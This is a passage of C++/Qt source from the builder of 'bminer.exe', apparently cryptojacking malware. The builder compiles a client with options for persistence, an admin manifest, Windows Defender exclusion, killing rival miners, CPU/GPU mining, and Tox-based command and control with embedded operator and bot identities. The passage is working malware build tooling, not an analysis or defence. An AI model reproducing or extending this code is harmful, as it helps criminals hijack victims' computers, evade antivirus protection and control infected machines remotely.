        if (!file.open(QIODevice::WriteOnly | QIODevice::Text | QIODevice::Truncate)) {
            if (output) output(tr("[!] Cannot write main.cpp\n"));
            return false;
        }
        file.write(content.toUtf8());
        file.close();
        return true;
    }

    if (output) output(tr("[*] No source modifications needed\n"));
    return true;
}

bool BuildSystem::runCMakeBuild(const QString &buildDir, const BuildConfig &config,
                                const std::function<void(const QString&)> &output)
{
    // A stale backup dir means a prior build was interrupted (app killed,
    // crash, power loss) after modifying source but before the qScopeGuard
    // restored it. Recover before touching anything so we don't lose the
    // original source under a fresh backup pass.
    const QString existingBackup = QDir(m_clientDir).filePath("backup");
    if (QDir(existingBackup).exists()) {
        if (output) output(tr("[!] Found stale backup from an interrupted build — restoring original source first\n"));
        restoreSourceFiles(m_clientDir);
    }

    // Kill the previously built client binary if it is still running.
    // Use PowerShell Get-CimInstance (wmic is deprecated/removed on Win11 24H2).
    {
        const QString prevBinary = QDir::toNativeSeparators(QDir(buildDir).filePath("bminer.exe"));
        if (QFile::exists(prevBinary)) {
            const QString ps = QStringLiteral("Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq '%1' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").arg(prevBinary);
            QProcess::execute("powershell", {"-NoProfile","-Command", ps});
        }
    }

    // Clean build directory
    if (QDir(buildDir).exists()) {
        QDir(buildDir).removeRecursively();
    }
    QDir().mkpath(buildDir);

    // Backup source files and arrange for them (and the generated resource
    // JSON) to be cleaned up no matter how we leave this function.
    backupSourceFiles(m_clientDir);
    auto cleanup = qScopeGuard([this] {
        restoreSourceFiles(m_clientDir);
        // Remove the backup dir now that source files are restored; leaving it
        // around confuses a second build run that expects a clean backup.
        QDir(QDir(m_clientDir).filePath("backup")).removeRecursively();
        QFile::remove(QDir(m_clientDir).filePath("resources/embedded_config.json"));
        QFile::remove(QDir(m_clientDir).filePath("resources/tox_config.json"));
    });

    // Modify source files
    if (!modifySourceFiles(config, output)) {
        return false;
    }

    // Find mingw32-make
    const QString makeProgram = makeProgramPath();
    const QString bin = mingwBinDir();

    // Build CMake arguments
    QStringList cmakeArgs;
    cmakeArgs << "-G" << "MinGW Makefiles"
              << "-DCMAKE_BUILD_TYPE=Release";

    if (!bin.isEmpty()) {
        cmakeArgs << "-DCMAKE_C_COMPILER="   + QDir(bin).filePath("gcc.exe")
                  << "-DCMAKE_CXX_COMPILER=" + QDir(bin).filePath("g++.exe")
                  << "-DCMAKE_RC_COMPILER="  + QDir(bin).filePath("windres.exe")
                  << "-DCMAKE_MAKE_PROGRAM=" + makeProgram;
    } else {
        cmakeArgs << "-DCMAKE_C_COMPILER=gcc"
                  << "-DCMAKE_CXX_COMPILER=g++"
                  << "-DCMAKE_RC_COMPILER=windres";
        if (!makeProgram.isEmpty())
            cmakeArgs << "-DCMAKE_MAKE_PROGRAM=" + makeProgram;
    }

    // Features
    if (config.persistence) cmakeArgs << "-DENABLE_PERSISTENCE=ON";
    if (config.debugConsole) cmakeArgs << "-DENABLE_DEBUG_CONSOLE=ON";
    if (config.adminManifest) cmakeArgs << "-DENABLE_ADMIN_MANIFEST=ON";
    if (config.defenderExclusion) cmakeArgs << "-DENABLE_DEFENDER_EXCLUSION=ON";
    if (config.foreignMinerKiller) cmakeArgs << "-DENABLE_FOREIGN_MINER_KILLER=ON";

    cmakeArgs << (config.cpuMiner ? "-DENABLE_CPU_MINER=ON" : "-DENABLE_CPU_MINER=OFF");
    cmakeArgs << (config.gpuMiner ? "-DENABLE_GPU_MINER=ON" : "-DENABLE_GPU_MINER=OFF");

    if (config.embedConfig && !config.embeddedConfigPath.isEmpty()) {
        if (!writeEmbeddedConfig(config)) {
            if (output) output(tr("[!] Failed to write embedded config: %1\n").arg(config.embeddedConfigPath));
            return false;
        }
        if (output) output(tr("[+] Embedded fallback config written: %1\n").arg(config.embeddedConfigPath));
        cmakeArgs << "-DENABLE_EMBEDDED_CONFIG=ON";
        cmakeArgs << "-DEMBEDDED_CONFIG_JSON_INPUT=" + config.embeddedConfigPath;
    }

    // How the client receives updated config: tox | endpoint | config_link.
    // Anything else (legacy registry value, typo) can only come from outside
    // the UI combo — reset to the default instead of passing it to CMake,
    // where unknown strings silently fall into the endpoint branches.
    static const QStringList kModes{ QStringLiteral("tox"), QStringLiteral("endpoint"), QStringLiteral("config_link") };
    QString mode = config.configUpdateMode.isEmpty()
                       ? QStringLiteral("tox") : config.configUpdateMode;
    if (!kModes.contains(mode)) {
        if (output) output(tr("[!] Unknown config update mode \"%1\" — using tox.\n").arg(mode));
        mode = QStringLiteral("tox");
    }
    cmakeArgs << "-DCONFIG_UPDATE_MODE=" + mode;

    // Tox C2 is compiled in when the operator supplied an ID or a generated
    // operator + bot pair exists. When a pair is present it is embedded.
    const bool haveToxPair = !config.toxOperatorId.trimmed().isEmpty()
                             && !config.toxBotSavedata.trimmed().isEmpty();
    // Tox mode without any operator identity would compile a client that
    // boots the stale embedded config and ignores every push. The Build page
    // gates this for UI builds; enforce it here too for direct callers.
    // (CMake re-checks with FATAL_ERROR as a second net.)
    if (mode == QStringLiteral("tox")
        && config.idTox.trimmed().isEmpty() && !haveToxPair) {
        if (output) output(tr("[!] Tox mode needs an operator identity — generate a Tox pair or paste a Tox ID.\n"));
        return false;
    }
    if (!config.idTox.trimmed().isEmpty() || haveToxPair) {
        cmakeArgs << "-DENABLE_TOX_C2=ON";
        if (haveToxPair) {
            if (!writeToxConfig(config)) {
                if (output) output(tr("[!] Failed to write tox config\n"));
                return false;
            }
            cmakeArgs << "-DTOX_CONFIG_INPUT=" + QDir(m_clientDir).filePath("resources/tox_config.json");
            if (output) output(tr("[+] Embedded tox pair (bot %1)\n").arg(config.toxBotId.left(8)));
        }
    }

    cmakeArgs << "..";

    if (output) output(tr("[*] Configuring with CMake...\n"));

    // Run CMake
    if (!runCommand("cmake", cmakeArgs, output, buildDir)) {
        return false;
    }

    if (output) output(tr("[*] Building with MinGW...\n"));

    // Run CMake build - try both ways
    bool buildSuccess = false;

    // First try: cmake --build
    buildSuccess = runCommand("cmake", {"--build", ".", "--config", "Release", "--parallel", "4"}, output, buildDir);

    // If that fails, try mingw32-make directly
    if (!buildSuccess && !makeProgram.isEmpty()) {
        if (output) output(tr("[*] Trying mingw32-make directly...\n"));
        buildSuccess = runCommand(makeProgram, {"-j4"}, output, buildDir);
    }

    if (buildSuccess) {
        // Cache the toxcli helper so the Control page can generate pairs and
        // push config without needing a full client build first.
        const QString toxcliBuilt = QDir(buildDir).filePath("toxcli.exe");
        const QString toxcliCached = toxCliPath();
        if (QFile::exists(toxcliBuilt) && !QFile::exists(toxcliCached)) {
            QDir().mkpath(QFileInfo(toxcliCached).absolutePath());
            if (QFile::copy(toxcliBuilt, toxcliCached))
                if (output) output(tr("[+] toxcli helper cached\n"));
        }

        // Verify the binary was created
        QString binaryPath = QDir(buildDir).filePath("bminer.exe");
        if (QFile::exists(binaryPath)) {
            if (output) output(tr("[+] Binary created: %1\n").arg(binaryPath));
            return true;
        }

        // Try alternative binary names
        QStringList possibleBinaries = {"bminer.exe", "Bminer.exe", "client.exe"};
        for (const QString &bin : possibleBinaries) {
            QString testPath = QDir(buildDir).filePath(bin);
            if (QFile::exists(testPath)) {
                if (output) output(tr("[+] Binary created: %1\n").arg(testPath));
                return true;
            }
        }

        if (output) output(tr("[!] Build completed but binary not found\n"));
        return false;
    }

    return false;
}

bool BuildSystem::build(const BuildConfig &config, const std::function<void(const QString&)> &output)
{
    // Serialise long-running entry points: two clicks (Build + Generate-Pair,
    // or Build + Push-Config) share this BuildSystem instance and would
    // otherwise race on the shared source tree. tryLock reports the
    // conflict to the user instead of silently corrupting state.
    QMutexLocker<QRecursiveMutex> locker(&m_runLock);
    (void)locker;

    emit progressUpdated(0, tr("Checking dependencies..."));

    // Check dependencies
    auto deps = checkDependencies();
    if (!deps.cmake || !deps.mingw) {
        if (output) output(tr("[!] Missing dependencies. Please install first.\n"));
        emit progressUpdated(0, tr("Missing dependencies"));
        return false;
    }

    emit progressUpdated(20, tr("Preparing build..."));

    // Check client directory
    if (!QDir(m_clientDir).exists()) {
        if (output) output(tr("[!] Client directory not found: %1\n").arg(m_clientDir));
        emit progressUpdated(0, tr("Client directory not found"));
        return false;
    }

    emit progressUpdated(40, tr("Building..."));

    // Run CMake build
    bool result = runCMakeBuild(m_buildDir, config, output);

    if (result) {
        emit progressUpdated(100, tr("Build complete"));
        if (output) {
            output(tr("[+] Build completed successfully!\n"));
            output(tr("[+] Binary: %1\n").arg(QDir(m_buildDir).filePath("bminer.exe")));
        }
        emit buildComplete(true);
    } else {
        emit progressUpdated(0, tr("Build failed"));
        if (output) output(tr("[!] Build failed!\n"));
        emit buildComplete(false);
    }

    return result;
}